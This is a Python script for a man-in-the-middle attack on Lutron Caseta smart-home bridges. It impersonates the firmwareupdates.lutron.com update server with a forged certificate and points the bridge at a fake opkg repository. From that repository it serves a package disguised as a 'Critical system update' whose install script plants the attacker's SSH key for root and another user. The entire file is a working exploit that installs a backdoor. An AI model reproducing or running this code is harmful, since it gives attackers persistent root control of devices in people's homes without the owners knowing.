#!/usr/bin/env python3
"""
Fake Lutron firmware update server for MITM.

Intercepts requests to firmwareupdates.lutron.com and serves
a malicious opkg package that installs an SSH key.

Runs HTTPS on port 443 with a self-signed cert for firmwareupdates.lutron.com.
Also runs HTTP on port 80 for the opkg repo.
"""
import http.server
import ssl
import json
import os
import subprocess
import sys
import threading
import tempfile

LISTEN = "0.0.0.0"
HTTPS_PORT = 443
HTTP_PORT = 80
REPO_DIR = "/tmp/fake-lutron-repo"

def generate_tls_cert():
    """Generate a self-signed cert for firmwareupdates.lutron.com"""
    cert_dir = "/tmp/fake-lutron-certs"
    os.makedirs(cert_dir, exist_ok=True)
    cert = os.path.join(cert_dir, "server.crt")
    key = os.path.join(cert_dir, "server.key")

    if not os.path.exists(cert):
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key, "-out", cert,
            "-days", "365", "-nodes",
            "-subj", "/C=US/ST=PA/O=Lutron Electronics Co Inc/CN=firmwareupdates.lutron.com"
        ], check=True, capture_output=True)
        print(f"[+] Generated TLS cert: {cert}")

    return cert, key


def create_malicious_package():
    """Create an opkg .ipk package that installs an SSH backdoor."""
    os.makedirs(REPO_DIR, exist_ok=True)

    ssh_key = open(os.path.expanduser("~/.ssh/id_rsa_lutron.pub")).read().strip()

    # Create the postinst script (runs after package install)
    postinst = f"""#!/bin/sh
mkdir -p /root/.ssh
echo '{ssh_key}' > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
mkdir -p /home/leap/.ssh
echo '{ssh_key}' > /home/leap/.ssh/authorized_keys
chmod 700 /home/leap/.ssh
chmod 644 /home/leap/.ssh/authorized_keys
# Also add to platform DB SSHKey table
sqlite3 /var/db/lutron-platform-db.sqlite "INSERT OR REPLACE INTO SSHKey (SSHKeyID, Name, UserName, Key) VALUES (99, 'exploit', 'leap', '{ssh_key}')" 2>/dev/null
/usr/sbin/updateAuthorizedKeys.sh 2>/dev/null &
exit 0
"""

    # Build a minimal .ipk (it's just an ar archive of tar.gz files)
    pkg_dir = tempfile.mkdtemp()
    data_dir = os.path.join(pkg_dir, "data")
    control_dir = os.path.join(pkg_dir, "control")
    os.makedirs(data_dir)
    os.makedirs(control_dir)

    # Control file
    with open(os.path.join(control_dir, "control"), "w") as f:
        f.write("""Package: lutron-ssh-backdoor
Version: 99.0.0
Architecture: armv7l
Description: System update
Maintainer: Lutron
""")

    with open(os.path.join(control_dir, "postinst"), "w") as f:
        f.write(postinst)
    os.chmod(os.path.join(control_dir, "postinst"), 0o755)

    # Create data.tar.gz (empty - we just need postinst to run)
    subprocess.run(["tar", "czf", os.path.join(pkg_dir, "data.tar.gz"), "-C", data_dir, "."],
                   check=True, capture_output=True)

    # Create control.tar.gz
    subprocess.run(["tar", "czf", os.path.join(pkg_dir, "control.tar.gz"),
                   "-C", control_dir, "control", "postinst"],
                   check=True, capture_output=True)

    # Create debian-binary
    with open(os.path.join(pkg_dir, "debian-binary"), "w") as f:
        f.write("2.0\n")

    # Create .ipk (ar archive) - use 'ar rcs' and handle macOS ar
    ipk_path = os.path.join(REPO_DIR, "lutron-update_99.0.0_armv7l.ipk")
    try:
        subprocess.run(["ar", "rcs", ipk_path,
                       os.path.join(pkg_dir, "debian-binary"),
                       os.path.join(pkg_dir, "control.tar.gz"),
                       os.path.join(pkg_dir, "data.tar.gz")],
                       check=True, capture_output=True)
    except subprocess.CalledProcessError:
        # macOS ar might need different flags, just concatenate manually
        with open(ipk_path, "wb") as out:
            out.write(b"!<arch>\n")
            for fname in ["debian-binary", "control.tar.gz", "data.tar.gz"]:
                fpath = os.path.join(pkg_dir, fname)
                data = open(fpath, "rb").read()
                name_padded = fname.ljust(16)[:16]
                header = f"{name_padded}0           0     0     100644  {len(data):<10d}`\n"
                out.write(header.encode())
                out.write(data)
                if len(data) % 2:
                    out.write(b"\n")
        print(f"[+] Created .ipk using manual ar format")

    print(f"[+] Created malicious package: {ipk_path}")

    # Create Packages index
    pkg_index = f"""Package: lutron-update
Version: 99.0.0
Architecture: armv7l
Filename: lutron-update_99.0.0_armv7l.ipk
Size: {os.path.getsize(ipk_path)}
Description: Critical system update
"""
    with open(os.path.join(REPO_DIR, "Packages"), "w") as f:
        f.write(pkg_index)

    # Create gzipped index
    subprocess.run(["gzip", "-k", os.path.join(REPO_DIR, "Packages")],
                   capture_output=True)

    print(f"[+] Created package index: {REPO_DIR}/Packages")
    return ipk_path


class FirmwareUpdateHandler(http.server.BaseHTTPRequestHandler):
    """Handle requests mimicking firmwareupdates.lutron.com"""

    def log_message(self, format, *args):
        print(f"[HTTPS] {self.client_address[0]} {format % args}")

    def do_POST(self):
        """Handle firmware update check-in and source requests."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode() if content_length else ""

        print(f"[HTTPS POST] {self.path}")
        print(f"  Body: {body[:500]}")

        # The curlscript.sh POSTs to get the repo URL
        # Respond with a URL pointing to our HTTP repo
        response = json.dumps({
            "Status": "UpdateAvailable",
            "Url": f"http://10.99.0.1:{HTTP_PORT}/repo",
            "Message": "Critical update available"
        })

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(response))
        self.end_headers()
        self.wfile.write(response.encode())

    def do_GET(self):
        """Handle any GET requests."""
        print(f"[HTTPS GET] {self.path}")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')


class RepoHandler(http.server.SimpleHTTPRequestHandler):
    """Serve the malicious opkg repo over HTTP and handle all requests."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=REPO_DIR, **kwargs)

    def log_message(self, format, *args):
        print(f"[HTTP] {self.client_address[0]} {format % args}")

    def do_POST(self):
        """Handle POST requests (time sync, checkin, etc.)."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode(errors="replace") if content_length else ""
        print(f"[HTTP POST] {self.path}")
        print(f"  Headers: {dict(self.headers)}")
        print(f"  Body: {body[:500]}")

        # Respond with generic OK
        if "utctime" in self.path:
            import datetime
            resp = json.dumps({"utctime": datetime.datetime.utcnow().isoformat() + "Z"})
        elif "sources" in self.path or "checkin" in self.path:
            resp = json.dumps({
                "Status": "UpdateAvailable",
                "Url": f"http://10.99.0.1:{HTTP_PORT}/",
                "Message": "Update available"
            })
        else:
            resp = json.dumps({"status": "ok"})

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(resp))
        self.end_headers()
        self.wfile.write(resp.encode())


def run_https(cert, key):
    server = http.server.HTTPServer((LISTEN, HTTPS_PORT), FirmwareUpdateHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    print(f"[+] HTTPS server on :{HTTPS_PORT}")
    server.serve_forever()


def run_http():
    server = http.server.HTTPServer((LISTEN, HTTP_PORT), RepoHandler)
    print(f"[+] HTTP repo server on :{HTTP_PORT} serving {REPO_DIR}")
    server.serve_forever()


if __name__ == "__main__":
    cert, key = generate_tls_cert()
    create_malicious_package()

    # Start both servers
    https_thread = threading.Thread(target=run_https, args=(cert, key), daemon=True)
    http_thread = threading.Thread(target=run_http, daemon=True)

    https_thread.start()
    http_thread.start()

    print("\n[*] Waiting for Caseta to check for updates...")
    print("[*] Watch dnsmasq for DNS queries to firmwareupdates.lutron.com")
    print("[*] The bridge checks on boot via checkForFWUpgradeSource.sh")

    try:
        https_thread.join()
    except KeyboardInterrupt:
        print("\n[*] Shutting down")
